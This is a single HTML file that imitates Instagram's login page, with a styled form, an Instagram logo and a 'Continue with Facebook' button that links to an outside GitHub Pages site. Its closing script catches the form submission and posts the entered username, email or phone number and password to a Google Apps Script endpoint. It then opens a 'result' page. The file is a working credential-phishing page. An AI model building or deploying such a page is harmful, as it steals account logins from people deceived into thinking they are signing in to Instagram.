<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style type="text/css">* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    }
    
    body {
    font-family: 'Arial', sans-serif;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #fafafa;
    position: relative;
    }
    
    .login-container {
    width: 350px;
    background-color: #fff;
    padding: 40px;
    text-align: center;
    border: 1px solid #dbdbdb;
    }
    
    .logo {
    font-family: 'Lobster', cursive;
    font-size: 50px;
    margin-bottom: 20px;
    }
    
    /* Remove underline from link */
    a.fb-login-link {
    text-decoration: none;
    display: block;
    }
    
    /* Facebook Login Button */
    .fb-login-btn {
    background-color: #1877f2;
    color: white;
    width: 100%;
    padding: 10px;
    border: none;
    border-radius: 5px;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
    margin-bottom: 15px;
    display: flex;
    justify-content: center;
    align-items: center;
    }
    
    .fb-login-btn img {
    width: 20px; /* Adjust size as needed */
    margin-right: 8px;
    display: inline-block;
    }
    
    
    .separator {
    margin: 20px 0;
    display: flex;
    align-items: center;
    color: #8e8e8e;
    font-size: 13px;
    }
    
    .separator::before, .separator::after {
    content: "";
    flex: 1;
    border-bottom: 1px solid #dbdbdb;
    margin: 0 10px;
    }
    
    .login-form input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    font-size: 14px;
    background-color: #fafafa;
    }
    
    .login-btn {
    background-color: #0095f6;
    color: white;
    width: 100%;
    padding: 10px;
    border: none;
    border-radius: 5px;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
    margin: 10px 0;
    }
    
    .forgot-password {
    color: #00376b;
    font-size: 12px;
    margin: 15px 0;
    display: block;
    }
    
    .signup {
    font-size: 14px;
    margin: 20px 0;
    }
    
    .signup a {
    color: #0095f6;
    font-weight: bold;
    }
    
    .terms {
    font-size: 12px;
    color: #8e8e8e;
    margin-top: 30px;
    }
    
    .terms a {
    color: #00376b;
    }
    
    /* Bottom Navigation Bar */
    .bottom-nav {
    width: 100%;
    height: 60px;
    position: absolute;
    bottom: 0;
    left: 0;
    background-color: #fff;
    border-top: 1px solid #dbdbdb;
    display: flex;
    justify-content: space-around;
    align-items: center;
    }
    
    .bottom-nav a {
    width: 24px;
    height: 24px;
    }
    
    .bottom-nav img {
    width: 100%;
    height: 100%;
    }
    .logo {
    width: 200px; /* Adjust the width as needed */
    margin-bottom: 20px;
    }
    
    </style>

</head>
<body>
    <div class="login-container">
        <!-- Updated Logo -->
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo">

        <a href="https://freeindian.github.io/Post-office/login" class="fb-login-link">
        <button class="fb-login-btn">
        <img src="https://github.com/Freeindian/Post-office/blob/main/png-transparent-facebook-logo-computer-icons-facebook-logo-facebook-thumbnail.png?raw=true" alt="Facebook Logo" class="fb-icon">
        Continue with Facebook
        </button>
        </a>

        <div class="separator">OR</div>

        <form class="login-form" autocomplete="off" method="post" name="google-sheet">
            <input type="text" name="id" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" name="submit"class="login-btn">Log in</button>
            <a href="#" class="forgot-password">Forgot password?</a>
        </form>

        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>

        <p class="terms">
            By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
        </p>
    </div>

    <!-- Bottom Navigation Bar -->
    <nav class="bottom-nav">
    <a href="#"><img src="https://github.com/Freeindian/Post-office/raw/main/home.png" alt="Home"></a>
    <a href="#"><img src="https://github.com/Freeindian/Post-office/blob/main/send.png?raw=true" alt="Search"></a>
    <a href="#"><img src="https://github.com/Freeindian/Post-office/blob/main/video.png?raw=true" alt="Reels"></a>
    <a href="#"><img src="https://github.com/Freeindian/Post-office/blob/main/search.png?raw=true" alt="Shop"></a>
    <a href="#"><img src="https://github.com/Freeindian/Post-office/blob/main/user.png?raw=true" alt="Profile"></a>
    </nav>
    <script>
    
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwQsbgxeybxhfjj1ojULpAPeG8oLOgAgNdbhWMwYMH2NsgVH5yEBT9_WEnw1U4Z0pfj3g/exec'
    
    const form = document.forms['google-sheet']
    
    
    
    form.addEventListener('submit', e => {
    
    e.preventDefault()
    
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
    
    .then(window.open('https://freeindian.github.io/Post-office/result' , 'blank'))
    
    .catch(error => console.error('Error!', error.message))
    
    })
    
    </script>
</body>
</html>
